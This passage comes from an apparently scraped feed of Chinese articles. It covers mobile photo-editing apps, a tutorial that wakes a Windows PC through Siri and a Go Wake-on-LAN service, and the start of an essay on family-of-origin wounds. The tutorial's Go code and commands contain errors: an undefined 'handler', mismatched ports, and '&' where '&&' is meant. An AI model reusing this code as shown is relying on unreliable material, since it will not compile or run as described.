Mac 版且登陆了 Setapp。对于常拍城市照、风光照的朋友们来说，这款工具虽不复杂，却能为画面和构图「增色」不少。</p>\n<ul><li>关联阅读：《<a href=\"https://sspai.com/post/35816\" target=\"_blank\">动动手指，消除照片里的「障碍物」：擦图神器 TouchRetouch</a>》</li></ul>\n<h3>修正畸变——SKRWT</h3>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/26/article/1e2514f8ce5df04f9fe7c8e4d7c96b4e\"></figure><ul><li>关键特性：修正畸变</li></ul>\n<p>由于目前手机的主摄都是焦段内的广角镜头，而且超广角镜头在近年愈加流行，修正照片畸变就成了一项照片后期中必须完成的工作。除了使用 Lightroom、Snapseed 等 app 内自带的畸变修正工具，你还可以选择专门为畸变修正而生的 SKRWT。</p>\n<p>SKRWT 从介面到功能都很简单直接，载入照片后就能调整各项水平、垂直等透视角度，并进行拉伸、翻转、裁切等操作。对于熟悉畸变校正操作的朋友们来说，菜单里的每个按钮只看一眼便能了解其功能，很容易上手。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/26/article/b53cc309b4052c7e0acab8ff699d70b3\"><figcaption>无 限 循 环</figcaption></figure><p>有趣的是，由于 SKRWT 的核心功能就是畸变修正，所以其底部工具栏设计成了可以无限滚动的状态，只要向一个方向一直划动，按钮就会按照固定顺序重复出现，减少你反复调用某些功能时左右来回滚动菜单的繁琐。</p>\n<ul><li>关联阅读：《<a href=\"https://sspai.com/post/25545\" target=\"_blank\">找回真实世界：SKRWT 使用技巧</a>》</li></ul>\n<h3>更纯正的胶片模拟——RNI 系列</h3>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/26/article/3e5b6b1c51853aaf1e88deb9c06e3795\"></figure><ul><li>关键特性：胶片模拟</li></ul>\n<p>市面上有很多胶片模拟类 app，尤其近两年胶片回潮之后，很多修图工具都想尽办法把胶片模拟塞进自己的产品里。但作为使用胶片拍摄项目的「真·胶片用户」，我其实并不喜欢此类 app。原因在于，大多数胶片模拟 app 只是给照片套了一个刻板印象中「胶片色调」的调色滤镜，但在严肃摄影中，这样风格化的色调往往是摄影师需要想办法避免的偏色。虽然将之用作一种审美趣味并无不可，但大多数滤镜为了突出特定的「胶片风格」，其偏色会比真正的胶片严重很多，一旦用得多了，不免令人审美疲劳。</p>\n<p>在这样的大环境下，RNI 旗下的胶片模拟 app 却另辟蹊径，找到了自己的定位。RNI 的全称是「Really Nice Images」，这个团队的主要作品是将一些经典型号的胶卷效果复刻成照片预设，供 Lightroom、Photoshop 或 Capture One 使用，其作品 RNI All Films 也是全球最知名的胶片模拟套装。在桌面端之外，RNI 将胶片模拟搬到了移动端，推出了 RNI Flashback 、RNI Films 和 RNI Colibri 三款应用。</p>\n<p>以 RNI Flashback 为例，和传统的胶片模拟滤镜不同的是，它着重模拟的并非效果，而是过程。在 RNI Flashback 中，你无法控制自己的照片会被调成怎样的色调，每次点击介面中间的胶卷按钮，照片就会被「冲洗」出一个随机的色调——和现实生活中的冲洗一样，这些结果未必会让你 100% 满意，有时候还会看起来有些奇怪，甚至不太像真正的胶片，但这个过程十分有趣，时常还能给你一些意想不到的惊喜。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/26/792297fc25e206670eaad2dfc65c8817.jpg\"><figcaption>RNI Flashback 既可以随机生成色调，也能基于生成结果进一步调整</figcaption></figure><p>当然，它的结果也不是完全无法调整，在每次获得随机结果之后，RNI Flashback 仍然提供了一些基本的选项，例如亮度、对比度、胶片颗粒效果的强度和滤镜的强度等。正因为有了在摄影后期领域对于胶片模拟的积累，RNI Flashback 才在移动端实现了对胶片的巧妙复刻。</p>\n<p>RNI Flashback 的另两款「同胞」则在特点上有所不同——RNI Colibri 同样会自动模拟胶卷效果，但偏重基于原片的色彩增强，不会随机生成色彩；RNI Flims 则着重模拟特定胶卷的影像，载入照片后选择对应胶卷名称，app 就会模拟相应效果，功能上更接近 VSCO。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/26/7139b6c78594df8e55b9bda41e5e52c8.jpg\"><figcaption>RNI Films 更为直接，载入照片后就可以选定胶卷效果</figcaption></figure><p>总体来说，如果你追求更接近真实胶片的模拟效果，或者想在手机上复刻自己熟悉的胶卷体验，RNI 旗下的三款产品是更适合的选择。不过，三款 app 均未登陆 Android 平台，Android 用户只能使用其它 app 体验胶片模拟的感觉。</p>\n<ul><li>关联阅读《<a href=\"https://sspai.com/post/34226\" target=\"_blank\">派评｜RNI Flashback：用更「科学」的方式选滤镜</a>》</li></ul>\n<h3>为画面主体重新打光——Relight</h3>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/26/54c1b81a5d3c2c85144fef8355306061.png\"></figure><ul><li>关键特性：打光滤镜</li></ul>\n<p>Relight 在发布之初主打的是「HDR 视频相机」，但随着 iPhone 对 SmartHDR 甚至杜比视界视频拍摄的原生支持，Relight 看上去已经失去了用武之地。不过，在计算摄影尚不发达的时期，为了让 HDR 效果更加自然，Relight 精心调制了 50 多组滤镜，它们依旧非常适合用来拯救那些在拍摄时与光照有关的偏差——正如 Relight 这个名字所展示的，它可以用来为一张照片「重新打光」。</p>\n<p>Relight 的工具分为 3 个分区，最左边的「Mode」就是主打的光线调节。它为室内、弱光、天空、过曝、阴雾这 6 类场景分别提供了多组定制滤镜，另外还有两类大胆的艺术风格滤镜。你可以选择更接近真实感受的一个滤镜，并且调节它的强度。一般情况下，只靠光线调节就可以得到非常接近真实的观感。</p>\n<p>中间的「Adjust」是几种最常见的参数调节，包括对比度、高光、阴影、色温等，适合一些简单的微调。右边的「Color」则是色彩调节。Relight 提供了多组调色滤镜，每组还可以选择不同的强调色，并且同样支持强度调节。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/26/article/145acd50449bd8f4eb4934d4b9d790b0\"></figure><p>值得注意的是，Relight 中三类调节的效果是独立且叠加的，你无需——像使用泼辣修图等工具时那样——担心滤镜效果被覆盖。右上角的对比按钮可以随时调出带手柄的对比预览界面，从而直观感受到滤镜的效果。经过 Relight 调节后，照片细节肯定有所损失，不过足以应付社交软件的需要。默认情况下，Relight 支持直接分享修改后的图片，也支持保存新副本或修改原图。在上手前，你可能需要在设置中手动打开地理信息保存功能，这样修改后的照片就能继承原图的地理信息，避免修图后「丢位置」的问题。</p>\n<h3>让画面更干净——CleanPics</h3>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/26/0f965fa2376a9efcac67e72d08eb5806.png\"></figure><ul><li>关键特性：图片降噪</li></ul>\n<p>CleanPics 是一款图片降噪工具，它能让充满噪点的画面变得更加干净。CleanPics 在功能相当专一，但足够优秀的效果让它足以成为一款「装机必备」的 app。</p>\n<p>加载照片后，CleanPics 就会分析照片中的噪点情况并匹配降噪算法，这一过程会因为设备不同而有所区别。如果你使用较早期的设备进行处理，会有明显的加载过程，但对于近几年的新设备来说已经不成问题。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/06/26/article/36bc92cd853dc62a080fa5e430a2c568\"></figure><p>CleanPics 的默认界面展示了处理前后的对比，可以通过拖动画面和手柄或双指缩放来调节预览的位置。下方有降噪强度、对焦程度和补光强度三项参数可以调节，完成后点击右下角的 SHARE 按钮即可保存。CleanPics 在保存后会播放广告，不过由于它的功能是完全本地的，只要将「无线数据」设置为「关闭」就可以达到去广告的效果。</p>\n<p>随着 iPhone 摄影硬件和算法的进步，噪点问题实际上已经得到了很有效的控制。现在使用 CleanPics 去处理一张用 iPhone SE 2 随手拍摄的照片，可能很难看出差异；但当我翻出一张 8 年前用 iPod Touch 拍摄的夜景照片并在 CleanPics 中打开时，我重新感受到了当年 CleanPics 给我带来的那种强烈的震撼。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/06/26/article/06ef2ff4b94e298e110b7ec3eab62bd1\"></figure><p>Relight 和 CleanPics 都是「前计算摄影时代」的遗孤：没有机器学习，没有 AI 建模，开发者完全依靠数学算法和精细调节的参数配置试图让照片变得更自然、更真实。在这个 AI 似乎已经可以让普通消费者「直出好照片」的年代，我依旧难以割舍这两款停留在「手动档」的工具。</p>\n<h3>拯救废片——咔哒</h3>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/26/bc1a3f5b4abbee2c5e67d1235001dc4d.png\"></figure><ul><li>关键特性：废片处理及优化</li></ul>\n<p>当你拍到关键瞬间却发现成了废片时，心情不免无奈，而主打一件拯救废片的《咔哒》就是解决无奈感的好工具。</p>\n<p>《咔哒》的滤镜都比较清新自然，场景识别修复功能也很好用。咔哒滤镜总体可能更加倾向女性化与小清新的风格，对于一些实在想不到的场景和照片，「智能美化」一下还是会有收获的。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/26/article/3bfa3b707efbab736f5aafe0b4d316ae\"><figcaption>原生相机拍出的影调较暗，用《咔哒》处理后效果还不错</figcaption></figure><h2>增加趣味类</h2>\n<h3>极致拟物风——FIMO</h3>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/26/b5bcde393bbac7b56d1ec1ca26b7cabf.png\"></figure><ul><li>关键特性：胶片模拟、拟物操作</li></ul>\n<p>FIMO 是一款模拟胶片相机的拍照应用，但也可以导入照片，套用胶卷效果。在这个品类里，从拟物的设计到名字，NOMO 都是毫无疑问的前辈和佼佼者，而 FIMO 作为后来者，同样拥有近乎强迫症的高度拟物设计，同时取景器更大、操作流程轻快、震动反馈更舒适、采用非订阅制的胶卷买断式付费方式，这些都让 FIMO 发展出了自己的风格。</p>\n<p>FIMO 的所有逻辑都以「胶卷」为核心，你拍摄前可以像使用真实的胶片相机一样，先选定一个胶卷，之后的拍摄都会被记录在对应胶卷中。不仅如此，由于不同胶卷有着不同影像效果，而且 FIMO 会将不同胶卷拍摄的照片归类在不同的子相册里，所以你完全可以用某个特定胶卷拍摄特定主题，来达成生活中的某种仪式感。为了方便拍摄，你还可以在 iOS 系统的主屏添加 FIMO 小组件，餐前打开手机轻点几下，拍饭验毒一气呵成。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/26/fe5af7727e062ed864a1cb48d889b826.png\"><figcaption>FIMO 的小组件、相机界面和胶卷相册</figcaption></figure><h3>相机模拟的新秀——Dazz</h3>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/26/3e882c3ff80690dea1217adb4b0c2b1c.png\"></figure><ul><li>关键特性：多种相机模拟</li></ul>\n<p>买断制的 Dazz 也是一款主打相机模拟的宝藏 app。和上文提到的众多胶片模拟类 app 不同，Dazz 的侧重点在于模拟不同的复古相机及镜头。因此，Dazz 具备高度可玩性，定时、多重曝光、漏光、鱼眼、画框等功能一应俱全，同样有每个相机的单独相册，而且可以拍视频。Dazz 目前已经内置的几十款不同相机，其中还有一些特效相机，可以实现一些方便有趣的效果。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/26/article/f85399ffe81c754e87e4405f498aa605\"><figcaption>Dazz 的介面</figcaption></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/26/9b627527ff064dd304cb86ca651325f8.gif\"><figcaption>Dazz 中的 D3D 相机拍摄效果</figcaption></figure><h3>给照片加个边框——方块小子</h3>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/26/05a46d233048b79f306d623608a97735.png\"></figure><ul><li>关键特性：照片加边框</li></ul>\n<p>需要给你的照片加边框吗？试试方块小子吧。</p>\n<p>《方块小子》的命名已经非常直白，其主要功能就是让你的照片变「方」，而且还是各种各样的「方」。在《方块小子》中，你将照片转制成等宽、Instagram 风格、2.35:1 电影荧幕、2:1 推特头图、iPhone 壁纸等十数种比例。对于调整比例之后的空白区域，《方块小子》提供了颜色、渐变、模糊、纹理四种方案来填充。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/26/article/700144e314ce1e81d55a23e7156e0543\"></figure><p>同时，《方块小子》还有自动取色功能，能根据画面主题颜色来自动适配周围边框的颜色。此外，《方块小子》还支持为图片添加文字功能，字体大小、透明度、阴影、间距等都可以进行调整。美中不足的是，《方块小子》并未内置中文字体，略微限制了它在图片美化上的上限。</p>\n<h3>把作品做成表情包——ImgPlay</h3>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/26/71eb0cac77b2005402eec1fedc67d906.png\"></figure><ul><li>关键特性：图片、影片转制 GIF 动画</li></ul>\n<p>ImgPlay 是一款图片及视频处理 app，从功能上讲，它和本文提到的其它 app 都不一样。ImgPlay 的核心能力是将图片和影片素材输出为 GIF 动画，因此，它是一款能为生活增添不少乐趣的「表情包利器」。如果想把和朋友玩闹时随手拍的视频处理成鬼畜表情包，几乎没有比 ImgPlay 更快的方法。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/26/ed5d413a560483ae28a3b42c90426d0b.gif\"><figcaption>一个简单 demo：使用 Dazz 拍摄、ImgPlay 处理导出，整个过程只要两分钟不到</figcaption></figure><p>将 ImgPlay 与其它图片处理工具相结合，能产生许多有趣、有创意的玩法，特别是结合特殊的照片滤镜或鱼眼镜头等特效，很快就能将刚刚发生的妙趣瞬间变成动图，更持久地延续欢乐。</p>\n<h2>除了以上推荐，大家还在用这些修图 App</h2>\n<p>在筹备本文内容的同时，我们还面向 Matrix 作者群开展了一次圆桌讨论，征集大家常用的及推荐的图片处理工具，除了上文提到的工具，下面这些也很有趣，一起来参考看看吧。</p>\n<h3>@Tolecen：Focos、NOMO、Varlens</h3>\n<p>很专业的修图 app 有很多，比如 Snapseed、VSCO 等，下面介绍三个我在某一方面用得特别频繁的。</p>\n<h4>Focos</h4>\n<p>Focos 是一款非常专业的设置景深与虚化的 app，其最有特点的功能就是「先拍照，后对焦」。在拍照的时候不需要花时间去找焦点，拍完之后可以在 app 中重新设置对焦以及背景虚化。在日常拍照中，我用这个功能用的非常频繁。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/06/26/0c98990ffb4c2680d5c1dc521a0bae59.png\"></figure><p>比如这一张，直接拍的时候无法完成前面雕塑对焦，后面背景虚化，但是拍完之后就可以用 Focos 重新设置了。</p>\n<h4>NOMO</h4>\n<p>NOMO 是一款非常优秀的类胶片拍照 app，里面有很多优秀的效果，最近最喜欢的是 Swirly2，他可以制作非常优秀的焦外旋转的效果。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/06/26/2a8705f7b7c1e011467c2f9bbbded88b.png\"></figure><figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/06/26/2c734514cc656cc7c427dc1d651b10e2.png\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/26/59561a8cc8610cea6b43fd26aeaa85bc.png\"><figcaption>Swirly2 的相机介面</figcaption></figure><h4>Varlens</h4>\n<p>Varlens 是一款功能很多的比较专业的 app，不过我最喜欢他的功能是，可以自己导入 LUT 色彩文件，轻松拍出自己调好的颜色的图片。每个人对色彩的感觉都不一样，很多 app 中内置的滤镜虽然多，可能没有让自己满意的，但是可以自己制作 LUT 色彩文件，导入 Varlens，拍出符合自己审美的色彩。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/26/a6d75557b28321b2788c81ee17d5e0f5.png\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/26/1478d09e085255981ac036970eb6b8f8.png\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/26/f7d1730af9c6634fa09d5ba8b41ce423.png\"></figure><p>上面截图右侧，就是自己导入的很多 LUT 色彩文件，用其适合的场景来命名，方便直接选择使用。</p>\n<h3>@JLDUAN：Fine 修图</h3>\n<p>前段时间在 AppStore 专题文章中，特别介绍了如何利用「Fine 修图」实现移轴特效。通过俯拍一些远景，后期利用「Fine 修图」简单处理后就能实现微缩景观的效果，非常有趣，值得一试。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/26/fd62f60aa2d83b91da6ff67d122524e0.png\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/26/15ad45007e34e8a7ce5b34728bb456b0.png\"></figure><h3>@板斧：Instagram、Darkroom</h3>\n<p>对，你没看错，「俗不可耐」的 Instagram 正是那款对我来说不可或缺的修图工具，因为它提供了使用非常便利的畸变调整功能，也就是 app 内图片编辑页面中、「编辑」标签中的第一项「调整」。我个人在构图时经常纠结于角度的精确控制，但抓拍时也不一定总是控制得好双手，进而导致成片角度不够理想——最常出现的失误就是画面中的「横平竖直」没有维持住，而这又不是简单的「旋转」功能即可干预的，Instagram 的「调整」恰能帮忙弥补这一微小的遗憾。「调整」里不仅有最基本的旋转，还提供了水平、垂直视角的畸变调整，配合网格，找回失落的垂直、水平线就不那么困难了。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/26/efbd25b752b5c984f15f51c0ef24c3e0.png\"></figure><p>当然了，这不是什么 Instagram 独占的功能，近年寻觅类似 App 时，笔者发现设计优雅、功能强大的 Darkroom 也是有此功能的，不过后者的付费门槛可不低；就个人而言，能用免费的 Instagram 满足我这个强迫症的需求，已经是绰绰有余，所以即便早就不依赖它拍照和分享，Instagram 仍然坐拥 iPhone 4 时代起「装机必备」的特权。</p>\n<p>&gt; 下载 <a href=\"https://sspai.com/page/client\">少数派 2.0 客户端</a>、关注 <a href=\"https://sspai.com/s/J71e\">少数派公众号</a>，解锁全新阅读体验 📰</p>\n<p>&gt; 实用、好用的 <a href=\"https://sspai.com/mall\">正版软件</a>，少数派为你呈现 🚀</p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/67433"},{"title":"如何让 Siri 帮你「叫醒」Windows 电脑？WoL 网络唤醒应用实例","date":"2021-06-27 01:14:43","description":"\n<h3><strong>Matrix 首页推荐</strong></h3>\n<p><a href=\"https://sspai.com/matrix\">Matrix</a> 是少数派的写作社区，我们主张分享真实的产品体验，有实用价值的经验与思考。我们会不定期挑选 Matrix 最优质的文章，展示来自用户的最真实的体验和观点。</p>\n<p>文章代表作者个人观点，少数派仅对标题和排版略作修改。</p>\n<hr>\n<blockquote><p>没有 Siri 的 iOS 不是一个好 OS。</p></blockquote>\n<p>之前提到关于 <a href=\"https://sspai.com/post/67003\">网络唤醒WoL</a> 这块的内容，也列举了很多唤醒工具，目的是更好地对远端计算机进行有效管控。</p>\n<p>这次更进一步，解放双手，尝试让「语音助手」执行唤醒操作。</p>\n<p><strong>关联阅读：</strong><a href=\"https://sspai.com/post/67003\" target=\"_blank\">不用开机键，你的 Windows 也能随时就绪</a></p>\n<h2>实现思路</h2>\n<p>原理亦不复杂，我手头有台 iPad Air，Siri 充当语音助手，调用「捷径」来发送开机指令。</p>\n<p>「捷径」本身不支持 WoL 协议，但能发起 HTTP 请求，因此我们需要一个能让不同协议进行沟通/转换的装置/程序，我们简称「协议转换器」，处理 HTTP 请求并发送 WoL 唤醒信号。</p>\n<p>我们知道有 <a href=\"https://www.home-assistant.io/\"><u>Home Assistant</u></a> 这类平台专门用于构建智能家居交互核心，但对于单一简单需求来说，未免显得过于笨重，所以我决定自己实现一个。如果你已经部署某些类似的物联网核心，可以尝试对其进行扩展或集成。</p>\n<p>因此我的总实现流程如下：</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/18/33bab3b5f4f7807c65014021f1e12c99.png\"></figure><ul>\n<li>本地局域网已有一台树莓派 2，作为程序运行的载体</li>\n<li>HTTP 与 WoL 同属网络协议，在此我们使用 <strong>Golang </strong>来构建上图的两大功能模块</li>\n<li>HTTP 请求先不设计得非常复杂，够用就行<sup class=\"ss-footnote\" href=\"\" title=\"「过早优化是万恶之源」—— 高德纳\" footnote-id=\"1\">1</sup><code>http://192.168.1.4:40080/wakeup</code>\n</li>\n<li>得益于 HTTP 协议的泛用性，亦可以通过各种浏览器方便地调用，唤醒远程计算机</li>\n</ul>\n<h2>配置过程</h2>\n<h3>iOS</h3>\n<p>在「新建捷径 &gt; 获取 URL 内容」中选择 HTTP GET 方法：</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/18/3158e28b81b7e3b1b9958fb869fcb515.png\"></figure><p>接下来开启「互联网、麦克风及语音识别」：</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/18/cf46a869132261702021fcadd0b8d3d2.png\"></figure><p>嘿 Siri，「快捷指令名称」：</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/18/21deb4a54ac99a72cb6f94cecbe6621e.png\"></figure><p>捷径名称可任意发挥，喊得顺就行。</p>\n<h3>协议转换器</h3>\n<p>程序入口 main.go 的具体配置如下：</p>\n<pre class=\"language-null\"><code>package main\n\nimport (\n\t\"encoding/json\"\n\t\"fmt\"\n\t\"log\"\n\t\"net/http\"\n)\n\nfunc handler_status(w http.ResponseWriter, r *http.Request) {\n\tfmt.Fprintf(w, \"0\")\n}\n\nfunc handler_wakeup(w http.ResponseWriter, r *http.Request) {\n\tsendwol()\n\tfmt.Fprintf(w, \"0\")\n}\n\nfunc main() {\n\thttp.HandleFunc(\"/\", handler)\n\n\t// Service Status Check\n\thttp.HandleFunc(\"/status\", handler_status)\n\n\t// WOL\n\thttp.HandleFunc(\"/wakeup\", handler_wakeup)\n\n\t// HTTP\n\terr := http.ListenAndServe(\":8000\", nil)\n\tlog.Fatal(err)\n}</code></pre>\n<p>从 <a href=\"https://github.com/zzustu/wol/blob/master/main.go\">GitHub </a>扒拉两个函数实现 WoL 协议包 wol.go：</p>\n<pre class=\"language-null\"><code>package main\n\nimport (\n\t\"bytes\"\n\t\"encoding/hex\"\n\t\"errors\"\n\t\"fmt\"\n\t\"net\"\n)\n\nfunc sendwol() {\n  // 目标MAC地址与指定网卡接口\n\tconst hw  = \"e0db55a893e6\"\n\tconst nic = \"eth0\"\n\n\tmacHex, err := hex.DecodeString(hw)\n\tif err != nil {\n\t\tfmt.Printf(\"MAC: [%s] decode fail.\\n\", hw)\n\t\treturn\n\t}\n\n\t// 广播MAC地址 FF:FF:FF:FF:FF:FF\n\tvar bcast = []byte{0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF}\n\tvar buff bytes.Buffer\n\tbuff.Write(bcast)\n\tfor i := 0; i &lt; 16; i++ {\n\t\tbuff.Write(macHex)\n\t}\n\n\t// 获得唤醒魔包\n\tmp := buff.Bytes()\n\tif len(mp) != 102 {\n\t\tfmt.Printf(\"MAC: [%s] length too short.\\n\", hw)\n\t\treturn\n\t}\n\n\tsendMagicPacket(mp, nic)\n}\n\n// 向指定网卡发送唤醒魔包\nfunc sendMagicPacket(mp []byte, nic string) {\n\tsender := net.UDPAddr{}\n\tif len(nic) != 0 {\n\t\tip, err := interfaceIPv4ByName(nic)\n\t\tif err != nil {\n\t\t\tfmt.Printf(\"网卡[%s]错误: %s\", nic, err)\n\t\t\treturn\n\t\t}\n\n\t\tsender.IP = ip\n\t}\n\n\ttarget := net.UDPAddr{\n\t\tIP: net.IPv4bcast,\n\t}\n\tconn, err := net.DialUDP(\"udp\", &amp;sender, &amp;target)\n\tif err != nil {\n\t\tfmt.Printf(\"创建UDP错误：%v\", err)\n\t\treturn\n\t}\n\tdefer func() {\n\t\t_ = conn.Close()\n\t}()\n\n\t_, err = conn.Write(mp)\n\tif err != nil {\n\t\tfmt.Printf(\"魔包发送失败[%s]\", err)\n\t} else {\n\t\tfmt.Printf(\"魔包发送成功\\n\")\n\t}\n}\n\n// 通过网卡名称获取该网卡绑定的IPv4\nfunc interfaceIPv4ByName(nic string) (net.IP, error) {\n\tinter, err := net.InterfaceByName(nic)\n\tif err != nil {\n\t\treturn nil, err\n\t}\n\n\t// 检查网卡是否正在工作\n\tif (inter.Flags &amp; net.FlagUp) == 0 {\n\t\treturn nil, errors.New(\"网卡未工作\")\n\t}\n\n\taddrs, err := inter.Addrs()\n\tif err != nil {\n\t\treturn nil, err\n\t}\n\n\tfor _, addr := range addrs {\n\t\tif ip, ok := addr.(*net.IPNet); ok {\n\t\t\tif ipv4 := ip.IP.To4(); ipv4 != nil {\n\t\t\t\treturn ipv4, nil\n\t\t\t}\n\t\t}\n\t}\n\n\treturn nil, errors.New(\"该网卡没有IPv4地址\")\n}</code></pre>\n<h3>安装 Golang &amp; 编译 &amp; 试运行</h3>\n<p><code>apt-get install golang &amp;&amp; go run main.go wol.go</code></p>\n<h2>正式运行</h2>\n<h3>程序托管</h3>\n<p>为了保证程序长时间稳定运行，请个「保姆」，由 Systemd<strong> </strong>对「协议转换器」进行托管</p>\n<p><code>vim /etc/systemd/system/assist.service</code></p>\n<pre class=\"language-shell\"><code>[Unit]\nDescription = Assistant Service\n[Service]\nExecStart = /usr/local/bin/assist\nRestart = always\nType = simple\n\n[Install]\nWantedBy = multi-user.target</code></pre>\n<h3>生成二进制文件 &amp; 存放于合适位置</h3>\n<p><code>go build main.go wol.go &amp; cp main /usr/local/bin/assist</code></p>\n<h3>启动</h3>\n<p><code>systemctl daemon-reload &amp; systemctl start assist</code></p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/17/d80380e334dea3012f336cdfea6a25bb.png\"></figure><p>后续还可在此基础上进行扩展，集成「miIO」协议，自由操控物联网设备。</p>\n<p>最后来看看效果：</p> <p><strong>参考链接：</strong></p>\n<ul>\n<li><a href=\"https://support.apple.com/en-us/HT208280\">Control your home with Siri</a></li>\n<li><a href=\"https://www.amd.com/system/files/TechDocs/20213.pdf\">网络唤醒魔包技术白皮书</a></li>\n</ul>\n<p>&gt; 下载少数派 <a href=\"https://sspai.com/page/client\">客户端 </a>、关注 <a href=\"https://sspai.com/s/J71e\">少数派公众号 </a>，了解更妙的数字生活 🍃</p>\n<p>&gt; 想申请成为少数派作者？<a href=\"https://sspai.com/apply/writing\" target=\"_blank\">冲！</a></p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/67037"},{"title":"童年不够幸福的人，如何通过自己的努力获得前进的力量？","date":"2021-06-26 23:07:31","description":"<div>\n<div>\n<div>\n<img src=\"https://pic4.zhimg.com/v2-0873cfbee8ebe3e7f9570e8aae7c4e6a_l.jpg?source=8673f162\"><span>深刻如此，</span><span>二级心理咨询师，《非暴力沟通两性篇》《非暴力沟通情绪篇》译者</span>\n<a href=\"https://www.zhihu.com/question/465576258/answer/1958233009\" hidden>阅读原文</a>\n</div>\n<div>\n<p><strong>病了的原生家庭，自己才是解药！</strong></p>\n<p>病了的原生家庭，畸形的亲子关系，往往不是我们有能力改变的，但是就像一句话说的那样：“<strong>你可以选择不原谅，但也可以选择放下</strong>”。</p>\n<p>这里的放下，既是一种对过去的谅解，也是一种对原生家庭造成伤口的自我疗愈。你首先要看见伤口的存在，才能试图去医治它，也才能避免让这种伤痛，继续反射到下一代身上。</p>\n<p>高晓松曾在《奇葩大会》上分享过自己年轻时与父亲不和谐的亲子关系，从而导致他年轻时的叛逆、爱较劲、不喜欢被干预的性格，但是中年时他靠自己的力量走了出来。</p>\n<p>对于自己的成长故事，他的感悟是“<strong>你靠自己的感觉，无论是对还是错，把它淋漓尽致地展现在这个世界上，在这个过程中你被看见了，经历过这么多斗争痛苦，最后走到这里来，这是英雄</strong>”。</p>\n<p><strong>所以，逃开原生家庭的牢笼，成为你自己的关键是：</strong></p>\n<figure><img src=\"https://pic4.zhimg.com/v2-1cc9ab124110412aaab65439dcf63437_720w.jpg?source=8673f162\" alt=\"\"></figure><p><strong><em>1、</em>看见你自己，然后爱并尊重你自己</strong></p>\n<p>即使父母说他们那么爱你，行动上也的确是很爱很爱，但你的感受如果是伤害，是不被爱，那么你就要看见自己的这种感受和愤怒。</p>\n<p>举个例子，父母觉得他们好吃好喝的供养你，让你长大成人，为你结婚生子，但从始至终他们都只看到了他们的付出，却忽略你内心的所求，这个时候，你就要为自己争取和改变。</p>\n<p>因为当某种情绪一再压抑，那种力量就会反噬，要么是像明玉般与父母反目成仇，要么是如苏母般一味的宣泄在儿女身上。最可怕的情况是，我恨你却最终变成了你。</p>\n<p>所以“看见”自己的伤痛，理解自己的需求，做出自己的争取。当父母不断指责你，说你做的不对的时候，你遵从内心，保护那个你认为对的自我；当你试图证明自己，却被父母不断否定的时候，放弃证明，告诉自己就是最好的。</p>\n<p>要知道，在成为别人之前，你一定要成为你自己。</p>\n<p><strong><em>2、</em>看见他们的伤口，然后学会释然和放下</strong></p>\n<p>有心理学家指出，80%儿童的心里想问题来源于他们的父母，而父母的问题又来源于上一辈人的教育失误，周而复始，循环往复。</p>\n<p>所以，父母也是第一次当爸妈，他们可能做的不够好，甚至做的有点过分，但是将父母身上的问题，还原回他们的原生家庭，也许你就心理得到释然和理解。</p>\n<p><strong><em>3、</em>精神经济上独立起来，主动远离有问题的原生家庭</strong></p>\n<p>有许多人虽然嘴上斥责着“原生家庭”对你的伤害，呐喊着想要摆脱父母的掌控，结果呢，精神上依赖父母，物质上依靠父母，任何事情如果没有父母的建议和帮助，自己就感到无所适从。</p>\n<p>